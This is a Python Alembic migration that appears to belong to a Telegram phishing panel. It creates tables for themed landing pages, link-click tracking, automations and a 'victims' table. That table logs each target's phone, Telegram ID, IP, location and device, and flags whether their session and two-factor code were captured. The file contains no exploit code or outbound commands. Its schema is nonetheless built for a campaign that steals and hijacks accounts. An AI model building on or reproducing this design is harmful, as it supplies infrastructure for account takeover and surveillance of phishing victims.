"""Add new features: landing_pages, victims, tracked_links, link_clicks, automations

Revision ID: 004_new_features
Revises: 003_telegram_events_team
Create Date: 2026-02-28
"""
from alembic import op
import sqlalchemy as sa
from sqlalchemy.sql import func

revision = '004_new_features'
down_revision = '003_telegram_events_team'
branch_labels = None
depends_on = None


def upgrade() -> None:
    op.create_table(
        'landing_pages',
        sa.Column('id', sa.Integer(), primary_key=True),
        sa.Column('slug', sa.String(100), unique=True, nullable=False, index=True),
        sa.Column('name', sa.String(200), nullable=False),
        sa.Column('html_content', sa.Text(), nullable=False),
        sa.Column('css_content', sa.Text(), nullable=True),
        sa.Column('js_content', sa.Text(), nullable=True),
        sa.Column('language', sa.String(10), server_default='uk'),
        sa.Column('theme', sa.String(30), server_default='telegram'),
        sa.Column('is_active', sa.Boolean(), server_default=sa.true()),
        sa.Column('visits', sa.Integer(), server_default='0'),
        sa.Column('conversions', sa.Integer(), server_default='0'),
        sa.Column('created_by', sa.Integer(), sa.ForeignKey('users.id'), nullable=True),
        sa.Column('created_at', sa.DateTime(), server_default=func.now()),
    )

    op.create_table(
        'victims',
        sa.Column('id', sa.Integer(), primary_key=True),
        sa.Column('phone', sa.String(20), nullable=False, index=True),
        sa.Column('tg_id', sa.String(20), nullable=True),
        sa.Column('username', sa.String(50), nullable=True),
        sa.Column('first_name', sa.String(100), nullable=True),
        sa.Column('ip', sa.String(45), nullable=True),
        sa.Column('country', sa.String(50), nullable=True),
        sa.Column('city', sa.String(100), nullable=True),
        sa.Column('device', sa.String(100), nullable=True),
        sa.Column('os', sa.String(50), nullable=True),
        sa.Column('browser', sa.String(50), nullable=True),
        sa.Column('user_agent', sa.Text(), nullable=True),
        sa.Column('landing_id', sa.Integer(), sa.ForeignKey('landing_pages.id'), nullable=True),
        sa.Column('campaign_id', sa.Integer(), sa.ForeignKey('campaigns.id'), nullable=True),
        sa.Column('session_captured', sa.Boolean(), server_default=sa.false()),
        sa.Column('twofa_captured', sa.Boolean(), server_default=sa.false()),
        sa.Column('status', sa.String(20), server_default='visited'),
        sa.Column('first_visit_at', sa.DateTime(), server_default=func.now()),
        sa.Column('code_submitted_at', sa.DateTime(), nullable=True),
        sa.Column('login_at', sa.DateTime(), nullable=True),
    )

    op.create_table(
        'tracked_links',
        sa.Column('id', sa.Integer(), primary_key=True),
        sa.Column('short_code', sa.String(20), unique=True, nullable=False, index=True),
        sa.Column('destination_url', sa.String(2000), nullable=False),
        sa.Column('campaign_id', sa.Integer(), sa.ForeignKey('campaigns.id'), nullable=True),
        sa.Column('clicks', sa.Integer(), server_default='0'),
        sa.Column('unique_clicks', sa.Integer(), server_default='0'),
        sa.Column('is_active', sa.Boolean(), server_default=sa.true()),
        sa.Column('created_by', sa.Integer(), sa.ForeignKey('users.id'), nullable=True),
        sa.Column('expires_at', sa.DateTime(), nullable=True),
        sa.Column('created_at', sa.DateTime(), server_default=func.now()),
    )

    op.create_table(
        'link_clicks',
        sa.Column('id', sa.Integer(), primary_key=True),
        sa.Column('link_id', sa.Integer(), sa.ForeignKey('tracked_links.id', ondelete='CASCADE'), nullable=False),
        sa.Column('ip', sa.String(45), nullable=True),
        sa.Column('user_agent', sa.Text(), nullable=True),
        sa.Column('country', sa.String(50), nullable=True),
        sa.Column('device_type', sa.String(20), nullable=True),
        sa.Column('os', sa.String(50), nullable=True),
        sa.Column('browser', sa.String(50), nullable=True),
        sa.Column('referer', sa.String(500), nullable=True),
        sa.Column('created_at', sa.DateTime(), server_default=func.now()),
    )

    op.create_table(
        'automations',
        sa.Column('id', sa.Integer(), primary_key=True),
        sa.Column('name', sa.String(200), nullable=False),
        sa.Column('trigger_type', sa.String(50), nullable=False),
        sa.Column('trigger_config', sa.JSON(), nullable=True),
        sa.Column('steps', sa.JSON(), nullable=False),
        sa.Column('is_active', sa.Boolean(), server_default=sa.true()),
        sa.Column('runs_count', sa.Integer(), server_default='0'),
        sa.Column('last_run', sa.DateTime(), nullable=True),
        sa.Column('created_by', sa.Integer(), sa.ForeignKey('users.id'), nullable=True),
        sa.Column('created_at', sa.DateTime(), server_default=func.now()),
    )


def downgrade() -> None:
    op.drop_table('automations')
    op.drop_table('link_clicks')
    op.drop_table('tracked_links')
    op.drop_table('victims')
    op.drop_table('landing_pages')
